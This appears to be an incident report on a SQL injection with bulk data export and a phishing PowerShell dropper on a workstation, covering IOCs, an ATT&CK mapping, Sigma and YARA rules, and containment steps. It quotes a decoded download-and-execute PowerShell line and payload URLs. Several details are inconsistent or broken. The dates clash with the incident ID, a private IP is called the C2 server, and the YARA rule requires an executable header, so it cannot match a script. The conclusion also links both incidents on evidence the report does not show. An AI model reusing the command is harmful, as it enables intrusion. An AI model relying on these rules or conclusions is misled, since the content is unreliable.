# Incident Report: INC-2026-0417

## 1. Executive Summary

On 2024-11-15 through 2024-11-16, two coordinated incidents were detected affecting the organization:

**Incident A:** SQL injection attempts and bulk data export from the production web server `web-01`
**Incident B:** Execution of a malicious PowerShell script (`facture_2024-11.ps1`) delivered via phishing email on workstation `PC-COMPTA-07`

The incidents are **linked** through the use of the same external IP address (203.0.113.42) and malicious domain (malicious-domain.ru) as command and control infrastructure.

## 2. Timeline of Events

| Date/Time (UTC) | Event | Source |
|---|---|---|
| 2024-11-15 21:18 - 22:30 | SQL injection attempts from 203.0.113.42 targeting web-1 | app.log, web_access.log |
| 2024-11-15 22:22-23:21 | Admin access and bulk data export (customers table) | web_access.log |
| 2024-11-16 08:41 | Malicious file downloaded via Outlook from phishing email | edr_events.jsonl |
| 2024-11-16 08:42 | PowerShell execution from INetCache path | edr_events.jsonl |
| 2024-11-16 08:42 | DNS query for malicious-domain.ru (NXDOMAIN) | edr_events.jsonl |
| 2024-11-16 08:42 | Network connect to 192.168.1.100:8080 (blocked) | edr_events.jsonl |
| 2024-11-16 08:42 | Host isolation triggered | edr_events.jsonl |

## 3. IOCs (Verified)

### IP Addresses
- **203.0.113.42** - External IP making SQL injection attempts, admin access, and bulk data export requests (verified in app.log and web_access.log)
- **192.168.1.100** - Command and control server IP address used in PowerShell payload (verified in facture_2024-11.ps1.txt line 22)
- **192.168.1.101** - Command and control server IP address used in PowerShell payload (verified in facture_2024-11.ps1.txt lines 23-24)

### Domain Names
- **malicious-domain.ru** - Malicious domain used for DNS query (NXDOMAIN result) and URL host for payloads (verified in edr_events.jsonl line 5 and facture_2024-11.ps1.txt line 24)

### File Hashes
- **064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40** - SHA256 hash of the malicious PowerShell script facture_2024-11.ps1 (verified in edr_events.jsonl line 1)

### File Paths
- **C:\Users\m.durand\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\X7K2P9QZ\facture_2024-11.ps1** - Full path of the malicious file delivered via phishing email attachment (verified in edr_events.jsonl lines 1-2)
- **X7K2P9QZ** - File identifier in the INetCache path for the delivered payload (verified in edr_events.jsonl lines 1-2)

### Encoded Commands
- **IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps')** - Base64-encoded PowerShell command decoded to IEX DownloadString instruction (verified in facture_2024-11.ps1.txt base64 content)

### User Accounts
- **CORP\m.durand** - Compromised user account that executed the malicious PowerShell script (verified in edr_events.jsonl multiple lines, lines 1-5)

## 4. MITRE ATT&CK Mapping

| Technique ID | Technique Name | Description | Supporting Evidence |
|---|---|---|---|
| T1059.001 | PowerShell | PowerShell execution from INetCache path | edr_events.jsonl lines 1-5 |
| T1059 | Command and Scripting Interpreter | SQL injection via web requests | app.log lines 7, 21-22; web_access.log |
| T1071 | Application Layer Protocol | C2 communication via HTTP to 192.168.1.100/101 and malicious-domain.ru | facture_2024-11.ps1.txt; edr_events.jsonl |
| T1078 | Valid Accounts | Compromised user account CORP\m.durand used for execution | edr_events.jsonl lines 1-5 |
| T1204 | User Execution | Phishing email delivered the malicious PowerShell script | ticket_INC-2026-0417.md; edr_events.jsonl |
| T1048 | Exfiltration Over Alternative Protocol | Bulk data export of customers table via HTTP GET requests | web_access.log |
| T1036 | Masquerading | Script disguised as "facture_2024-11.ps1" (French for invoice) | facture_2024-11.ps1.txt |
| T1114 | Email Collection | Phishing email targeting user to execute malicious script | ticket_INC-2026-0417.md |
| T1190 | Exploit Public-Facing Application | SQL injection attempts against web-01 production server | app.log; web_access.log |

## 5. Detection Rules

### Sigma Rule: Potential PowerShell Execution from INetCache

```yaml
title: Potential PowerShell Execution from INetCache
status: experimental
description: Detects PowerShell execution from suspicious INetCache paths, associated with the facture_2024-11.ps1 incident
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4104
    Channel: Microsoft-Windows-PowerShell/Operational
    Image|contains:
      - 'INetCache'
  selection2:
    CommandLine|contains:
      - 'DownloadString'
      - 'IEX'
  condition: selection or selection2
falsepositives:
  - Legitimate scripts in INetCache
level: high
```

**Validation:** VALID SIGMA RULE - passed pySigma parsing

### YARA Rule: PowerShell_Encoded_Command_Malware

```yararule
rule PowerShell_Encoded_Command_Malware {
    meta:
        description = "Detects PowerShell scripts with encoded commands (Base64) associated with the facture_2024-11.ps1 incident"
        author = "Incident Response Team"
        incident_id = "INC-2026-0417"
        date = "2024-11-16"
    strings:
        $encoded_base64 = /SQBFAFgAIAAo/ wide
        $iex_command = /IEX\s*\(New-Object/ wide
        $webclient_download = /Net\.WebClient.*DownloadString/ wide
        $malicious_domain = /malicious-domain\.ru/ wide
    condition:
        uint16(0) == 0x5A4D and (2 of ($encoded_base64, $iex_command, $webclient_download, $malicious_domain))
}
```

**Note:** YARA rule compiled successfully with the encoded command pattern and malicious domain indicator.

## 6. Containment Actions (Proposed, pending human validation)

1. **Host Isolation:** PC-COMPTA-07 was already isolated by the on-call analyst at 08:42 UTC on 2024-11-16
2. **IP Blocking:** Block 203.0.113.42 at the firewall perimeter
3. **Domain Blocking:** Block malicious-domain.ru at the DNS level
4. **URL Blocking:** Block http://192.168.1.100/stage.ps1, http://192.168.1.101/beacon.exe, http://malicious-domain.ru/payload.dll
5. **Account Reset:** Reset credentials for CORP\m.durand account
6. **Email Filtering:** Update email security filters to block messages with .ps1 attachments or PowerShell download commands

## 7. Recommendations

1. **Immediate:** 
   - Confirm PC-COMPTA-07 isolation is still in effect
   - Scan PC-COMPTA-07 with full antivirus/EDR scan
   - Review email headers and user m.durand's sent items for the phishing email

2. **Short-term:**
   - Implement enhanced monitoring for PowerShell execution from INetCache paths
   - Deploy additional Sigma rules for encoded PowerShell commands
   - Conduct user awareness training on phishing recognition

3. **Long-term:**
   - Implement application whitelisting to prevent unauthorized PowerShell execution
   - Deploy network segmentation to limit lateral movement
   - Enhance email security with attachment sandboxing

## 8. Conclusion

The incident involved two coordinated attack vectors:
1. SQL injection and data exfiltration from the web server
2. Phishing-delivered PowerShell execution leading to C2 communication

The same threat actor (203.0.113.42 / malicious-domain.ru) was behind both campaigns. The workstation has been isolated, and the malicious script was disarmed. Continued monitoring and the proposed detection rules will help ensure early detection of any follow-up activity.

---
**Report generated:** 2024-11-16
**Incident ID:** INC-2026-0417
**Classification:** High Priority